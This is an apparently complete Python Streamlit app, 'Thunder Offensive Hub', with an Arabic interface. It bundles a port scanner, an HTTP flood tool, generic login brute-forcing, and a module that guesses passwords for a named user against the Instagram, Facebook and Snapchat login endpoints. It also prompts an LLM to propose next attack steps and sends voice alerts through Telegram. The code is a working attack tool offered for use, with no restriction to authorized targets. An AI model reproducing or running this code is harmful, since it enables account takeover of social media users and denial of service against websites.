import streamlit as st
import pandas as pd
import os
import requests
import json
import tempfile
import socket
from datetime import datetime
from dotenv import load_dotenv
from gtts import gTTS
# from scapy.all import IP, TCP, send, sr1 # تم إزالة Scapy لحل مشكلة الصلاحيات
from groq import Groq
from bs4 import BeautifulSoup
from fpdf2 import FPDF
import time
import arabic_reshaper
from bidi.algorithm import get_display

# --- 1. إعدادات الهوية والترسانة ---
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
GROQ_KEY = os.getenv("GROQ_API_KEY") # استخدام مفتاح Groq للتحليل الذكي

st.set_page_config(page_title="Thunder Offensive Hub", layout="wide", page_icon="🛡️")

st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #ffffff; }
    h1, h2, h3, h4, h5, h6 { color: #FF0000; text-align: center; font-family: 'Courier New'; }
    .stButton>button { background-color: #FF0000; color: white; border-radius: 5px; border: none; padding: 10px 20px; }
    .stButton>button:hover { background-color: #CC0000; }
    .stTextInput>div>div>input { background-color: #333333; color: white; border: 1px solid #FF0000; }
    .stTextArea>div>div>textarea { background-color: #333333; color: white; border: 1px solid #FF0000; }
    .stSelectbox>div>div>div { background-color: #333333; color: white; border: 1px solid #FF0000; }
    .stCode { background-color: #1a1a1a; color: #00FF00; border: 1px solid #00FF00; }
    </style>
    """, unsafe_allow_html=True)

st.title("🛡️ مركز الرعد الهجومي (Offensive Pro)")

# --- 2. محرك العمليات الهجومية (The Offensive Engine) ---
class OffensiveModule:
    @staticmethod
    def port_scanner(target_ip, ports):
        """ Port Scanning باستخدام Socket """
        open_ports = []
        for port in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1) # تقليل المهلة لتسريع الفحص
            try:
                if s.connect_ex((target_ip, port)) == 0:
                    open_ports.append(port)
            except socket.error as e:
                pass
            finally:
                s.close()
        return open_ports

    @staticmethod
    def dos_simulator(target_url, num_requests=100):
        """ DoS Simulation باستخدام Requests (محاكاة هجوم HTTP Flood) """
        results = []
        st.info(f"بدء محاكاة DoS على {target_url} بإرسال {num_requests} طلب...")
        for i in range(num_requests):
            try:
                response = requests.get(target_url, timeout=1)
                results.append(f"تم إرسال الطلب {i+1} بنجاح. الحالة: {response.status_code}")
            except requests.exceptions.RequestException as e:
                results.append(f"فشل إرسال الطلب {i+1}: {str(e)}")
            time.sleep(0.01) # تأخير بسيط لتجنب إغراق الشبكة المحلية
        return "\n".join(results)

    @staticmethod
    def auth_brute_force(url, user_list, pass_list):
        """ Auth Bypass محاكاة باستخدام Requests الهجومية """
        st.info(f"بدء محاولة تجاوز المصادقة على {url}...")
        found_credentials = []
        for user in user_list:
            for password in pass_list:
                try:
                    resp = requests.post(url, data={
                        'username': user, 
                        'password': password 
                    }, timeout=5)
                    if resp.status_code == 200 and "success" in resp.text.lower():
                        found_credentials.append(f"تم الاختراق! المستخدم: {user}, كلمة المرور: {password}")
                        st.success(f"تم الاختراق! المستخدم: {user}, كلمة المرور: {password}")
                        return found_credentials
                except requests.exceptions.RequestException as e:
                    st.warning(f"خطأ في الاتصال بـ {url}: {e}")
                    return [f"فشل الاتصال: {e}"]
        if not found_credentials:
            st.info("فشلت عملية التجاوز. لم يتم العثور على بيانات اعتماد صالحة.")
        return found_credentials

    @staticmethod
    def thunder_brute_force(username, wordlist_content, platform="Custom", custom_url=None):
        """ وحدة التخمين الإضافية (Thunder Force) المطورة مع منطق المنصات المختار """
        if platform == "Instagram":
            target_url = "https://www.instagram.com/accounts/login/ajax/"
            u_field = "username"
            p_field = "enc_password"
        elif platform == "Facebook":
            target_url = "https://www.facebook.com/login/"
            u_field = "email"
            p_field = "pass"
        elif platform == "Snapchat":
            target_url = "https://accounts.snapchat.com/accounts/login"
            u_field = "username"
            p_field = "password"
        else:
            target_url = custom_url if custom_url else "http://127.0.0.1:5000/login"
            u_field = "username"
            p_field = "password"

        passwords = wordlist_content.splitlines()
        for password in passwords:
            password = password.strip()
            if not password: 
                continue
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
                data = {u_field: username, p_field: password}
                response = requests.post(target_url, data=data, headers=headers, timeout=2)
                if response.status_code == 200 and "success" in response.text.lower():
                    return f"✅ تم العثور على الرمز لـ {platform}: {password}"
            except:
                continue
        return f"❌ انتهت القائمة على {platform} دون العثور على الرمز."

class OSINTModule:
    @staticmethod
    def get_website_info(url):
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            title = soup.title.string if soup.title else "لا يوجد عنوان"
            description = "لا يوجد وصف"
            meta_desc = soup.find('meta', attrs={'name': 'description'})
            if meta_desc and 'content' in meta_desc.attrs:
                description = meta_desc['content']
            external_links = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('http') and not url in a['href']]
            technologies = []
            if soup.find('script', src=lambda x: x and 'jquery' in x.lower()): technologies.append('jQuery')
            if soup.find('meta', attrs={'name': 'generator'}): technologies.append(soup.find('meta', attrs={'name': 'generator'})['content'])
            return {
                "العنوان": title,
                "الوصف": description,
                "الروابط الخارجية": external_links[:5],
                "التقنيات المحتملة": technologies if technologies else "غير محددة"
            }
        except requests.exceptions.RequestException as e:
            return {"خطأ": f"فشل الاتصال بالرابط: {e}"}
        except Exception as e:
            return {"خطأ": f"حدث خطأ غير متوقع: {e}"}

class AIAnalyzer:
    def __init__(self, api_key):
        self.client = Groq(api_key=api_key)

    def analyze_ports(self, target_ip, open_ports):
        if not open_ports:
            return "لا توجد منافذ مفتوحة لتحليلها. الهدف آمن على ما يبدو."
        prompt = f"الهدف هو {target_ip} والمنافذ المفتوحة هي: {', '.join(map(str, open_ports))}. بناءً على هذه المعلومات، ما هي الثغرات المحتملة التي يجب أن أبحث عنها؟ وما هي خطوات الهجوم التالية المقترحة؟ أجب ببرود وكفاءة مطلقة."
        try:
            completion = self.client.chat.completions.create(
                model="llama-3.1-8b-instant", 
                messages=[
                    {"role": "system", "content": "أنت مساعد أمني خبير في تحليل الثغرات واقتراح خطوات الهجوم. رد ببرود وكفاءة مطلقة."}, 
                    {"role": "user", "content": prompt}
                ],
                temperature=0.1
            )
            return completion.choices[0].message.content
        except Exception as e:
            return f"🚨 خلل في تحليل الذكاء الاصطناعي: {str(e)}"

class PDFReportGenerator:
    def __init__(self):
        self.font_path = "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"

    def fix_arabic(self, text):
        if not text: return ""
        reshaped_text = arabic_reshaper.reshape(str(text))
        return get_display(reshaped_text)

    def generate_report(self, filename="report.pdf", report_data={}):
        pdf = FPDF()
        pdf.add_font('Arabic', '', self.font_path)
        pdf.add_page()
        
        pdf.set_text_color(200, 0, 0)
        pdf.set_font('Arabic', '', 22)
        pdf.cell(0, 15, self.fix_arabic("تقرير مركز الرعد الهجومي"), ln=True, align='C')
        pdf.set_draw_color(200, 0, 0)
        pdf.line(10, 30, 200, 30)
        pdf.ln(10)
        
        pdf.set_text_color(100, 100, 100)
        pdf.set_font('Arabic', '', 10)
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        pdf.cell(0, 10, self.fix_arabic(f"تاريخ التقرير: {current_time}"), ln=True, align='R')
        pdf.ln(5)

        for section_title, section_content in report_data.items():
            pdf.set_text_color(150, 0, 0)
            pdf.set_font('Arabic', '', 15)
            pdf.cell(0, 10, self.fix_arabic(f"◀ {section_title}"), ln=True, align='R')
            pdf.set_text_color(0, 0, 0)
            pdf.set_font('Arabic', '', 11)
            
            if isinstance(section_content, list):
                content_text = "\n".join(map(str, section_content))
            elif isinstance(section_content, dict):
                content_text = json.dumps(section_content, indent=2, ensure_ascii=False)
            else:
                content_text = str(section_content)
                
            pdf.multi_cell(0, 8, self.fix_arabic(content_text), align='R')
            pdf.ln(5)
            pdf.set_draw_color(230, 230, 230)
            pdf.line(10, pdf.get_y(), 200, pdf.get_y())
            pdf.ln(5)
        
        pdf.output(filename)
        return filename

# --- 3. نظام التنبيه الصوتي الأردني المطور ---
class VoiceAlertSystem:
    def __init__(self):
        self.bot_name = "الرعد الاردني"
        
    def create_voice_alert(self, text):
        jordanian_text = f"يا قائد أبو سعود، {text}، نحن بالخدمة."
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".mp3")
        tts = gTTS(text=jordanian_text, lang='ar', slow=False)
        tts.save(temp_file.name)
        return temp_file.name

    def send_voice_alert(self, message):
        if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
            st.warning("🚨 لا يمكن إرسال التنبيه الصوتي: توكن التيليجرام أو معرف الدردشة مفقود.")
            return
        try:
            voice_path = self.create_voice_alert(message)
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVoice"
            with open(voice_path, 'rb') as v:
                requests.post(url, files={'voice': v}, data={'chat_id': TELEGRAM_CHAT_ID}, timeout=10)
            os.unlink(voice_path)
        except Exception as e:
            st.error(f"فشل إرسال التنبيه الصوتي: {e}")

# --- 4. واجهة العمليات المركزية ---
hub = VoiceAlertSystem()
attacker = OffensiveModule()
ai_analyzer = AIAnalyzer(GROQ_KEY) if GROQ_KEY else None
report_generator = PDFReportGenerator()

if 'report_data' not in st.session_state:
    st.session_state.report_data = {}

# قائمة الرموز الشائعة المدمجة (Built-in Wordlist)
# قائمة الرموز الشائعة المدمجة (Built-in Wordlist) - تم نقلها إلى ملف wordlist.txt
DEFAULT_WORDLIST_PATH = "wordlist.txt"

def load_default_wordlist():
    if os.path.exists(DEFAULT_WORDLIST_PATH):
        with open(DEFAULT_WORDLIST_PATH, "r", encoding="utf-8") as f:
            return f.read()
    else:
        st.warning(f"🚨 ملف قائمة الرموز {DEFAULT_WORDLIST_PATH} غير موجود. يرجى التأكد من وجوده في نفس مجلد التطبيق.")
        return ""

# استدعاء القائمة عند الحاجة
# DEFAULT_WORDLIST = load_default_wordlist() # سيتم استدعاؤها داخل الدالة عند الحاجة


tabs = st.tabs(["⚔️ اختبار الاختراق الذكي", "🔍 جمع المعلومات (OSINT)", "📊 لوحة القيادة", "⚡ وحدة التخمين", "📄 التقارير"])

with tabs[0]:
    st.header("وحدة الهجوم والاستطلاع (Network Targeting)")
    col1, col2 = st.columns(2)
    with col1:
        target = st.text_input("🎯 عنوان الهدف (IP/Domain):", placeholder="192.168.1.1 أو example.com")
        scan_type = st.selectbox("نوع العملية:", ["Port Scanning", "DoS Simulation (HTTP Flood)", "Auth Bypass"])
    
    if st.button("🚀 تنفيذ العملية"):
        if not target:
            st.warning("حدد الهدف أولاً يا قائد.")
        else:
            with st.spinner("جاري تنفيذ بروتوكول الرعد..."):
                st.session_state.report_data["الهدف"] = target
                st.session_state.report_data["نوع العملية"] = scan_type
                
                if scan_type == "Port Scanning":
                    ports_to_scan = st.text_input("المنافذ للفحص (مفصولة بفاصلة):", "21,22,80,443,3389").split(',')
                    ports_to_scan = [int(p.strip()) for p in ports_to_scan if p.strip().isdigit()]
                    
                    results = attacker.port_scanner(target, ports_to_scan)
                    st.code(f"نتائج فحص المنافذ للهدف {target}: {results}")
                    hub.send_voice_alert(f"خلصنا فحص المنافذ، لقينا {len(results)} منافذ مفتوحة.")
                    st.session_state.report_data["نتائج فحص المنافذ"] = results
                    if ai_analyzer and results:
                        ai_analysis = ai_analyzer.analyze_ports(target, results)
                        st.write(ai_analysis)
                        st.session_state.report_data["تحليل الذكاء الاصطناعي"] = ai_analysis

                elif scan_type == "DoS Simulation (HTTP Flood)":
                    num_requests = st.number_input("عدد الطلبات المراد إرسالها (للمحاكاة فقط):", min_value=1, value=100)
                    res = attacker.dos_simulator(target, num_requests)
                    st.success(res)
                    hub.send_voice_alert(f"تم إرسال {num_requests} طلب HTTP بنجاح.")
                    st.session_state.report_data["نتائج محاكاة DoS"] = res

                elif scan_type == "Auth Bypass":
                    st.info("جاري محاولة تجاوز المصادقة (Logic Exploitation)...")
                    auth_url = st.text_input("رابط صفحة تسجيل الدخول (Login URL):", placeholder="http://example.com/login")
                    user_list_str = st.text_area("قائمة المستخدمين (كل مستخدم في سطر):", "admin\nuser\ntest")
                    pass_list_str = st.text_area("قائمة كلمات المرور (كل كلمة مرور في سطر):", "password\n123456\nadmin")
                    
                    user_list = [u.strip() for u in user_list_str.split('\n') if u.strip()]
                    pass_list = [p.strip() for p in pass_list_str.split('\n') if p.strip()]

                    if auth_url and user_list and pass_list:
                        found_creds = attacker.auth_brute_force(auth_url, user_list, pass_list)
                        if found_creds:
                            st.success("تم العثور على بيانات اعتماد!")
                            for cred in found_creds:
                                st.write(cred)
                            hub.send_voice_alert("تم العثور على بيانات اعتماد في عملية تجاوز المصادقة.")
                        else:
                            st.info("فشلت عملية تجاوز المصادقة.")
                            hub.send_voice_alert("فشلت عملية تجاوز المصادقة.")
                        st.session_state.report_data["نتائج تجاوز المصادقة"] = found_creds if found_creds else "فشل"
                    else:
                        st.warning("يرجى توفير رابط تسجيل الدخول وقوائم المستخدمين وكلمات المرور.")

with tabs[1]: # OSINT Tab
    st.header("🔍 وحدة جمع المعلومات الاستخباراتية (OSINT)")
    osint_target = st.text_input("🌐 رابط الموقع المستهدف (URL):", placeholder="https://www.example.com")
    if st.button("جمع المعلومات"):
        if not osint_target:
            st.warning("يرجى إدخال رابط الموقع المستهدف.")
        else:
            with st.spinner("جاري جمع المعلومات الاستخباراتية..."):
                info = OSINTModule.get_website_info(osint_target)
                if "خطأ" in info:
                    st.error(info["خطأ"])
                    hub.send_voice_alert("فشل جمع المعلومات الاستخباراتية.")
                else:
                    st.subheader("نتائج جمع المعلومات:")
                    for key, value in info.items():
                        st.write(f"**{key}:** {value}")
                    hub.send_voice_alert("تم جمع المعلومات الاستخباراتية بنجاح.")
        if "report_data" not in st.session_state:
            st.session_state.report_data = {}
        st.session_state.report_data["نتائج OSINT"] = info

with tabs[2]: # Dashboard Tab
    st.subheader("إحصائيات الترسانة")
    st.write(f"المكتبات النشطة: `Socket`, `Requests`, `BeautifulSoup`, `Groq`, `gTTS`, `fpdf2`, `arabic_reshaper`")
    st.success("جميع أنظمة الهجوم جاهزة للعمل.")

with tabs[3]: # Brute Force Tab
    st.header("⚡ وحدة التخمين الهجومي (Brute Force)")
    platform_choice = st.selectbox("🎯 اختر المنصة المستهدفة للهجوم:", ["Instagram", "Facebook", "Snapchat", "Custom URL"])
    custom_target_url = st.text_input("🔗 الرابط المخصص:", "http://127.0.0.1:5000/login") if platform_choice == "Custom URL" else None
    t_user = st.text_input("👤 اسم المستخدم المستهدف:")
    
    # خيار استخدام قائمة رموز مدمجة أو رفع ملف
    use_builtin_wordlist = st.checkbox("استخدام قائمة رموز مدمجة قوية", value=True)
    t_file = None
    if not use_builtin_wordlist:
        t_file = st.file_uploader("📂 ارفع ملف قائمة الرموز (.txt):")

    if st.button("بدء الهجوم التخميني"):
        wordlist_to_use = ""
        if use_builtin_wordlist:
            wordlist_to_use = load_default_wordlist()
        elif t_file:
            wordlist_to_use = t_file.read().decode('utf-8')
        
        if t_user and wordlist_to_use:
            with st.spinner(f"جاري التخمين على منصة {platform_choice} الآن..."):
                res = attacker.thunder_brute_force(t_user, wordlist_to_use, platform=platform_choice, custom_url=custom_target_url)
                st.info(res)
                st.session_state.report_data["نتائج التخمين"] = res
                hub.send_voice_alert(f"انتهى التخمين على منصة {platform_choice} لـ {t_user}")
        else:
            st.error("أكمل البيانات المطلوبة (اسم المستخدم وقائمة الرموز)." if not use_builtin_wordlist else "أكمل البيانات المطلوبة (اسم المستخدم).")

with tabs[4]: # Reports Tab
    st.header("📄 وحدة التقارير الاحترافية")
    report_filename = st.text_input("اسم ملف التقرير:", "Thunder_Report")
    if st.button("توليد تقرير PDF"):
        if st.session_state.get('report_data'):
            with st.spinner("جاري توليد تقرير PDF..."):
                pdf_file = report_generator.generate_report(f"{report_filename}.pdf", st.session_state.report_data)
                with open(pdf_file, "rb") as f:
                    st.download_button(label="تحميل تقرير PDF", data=f.read(), file_name=pdf_file, mime="application/pdf")
                st.success("تم توليد التقرير بنجاح!")
                hub.send_voice_alert("تم توليد تقرير PDF بنجاح.")
        else:
            st.warning("لا توجد بيانات لتوليد التقرير.")
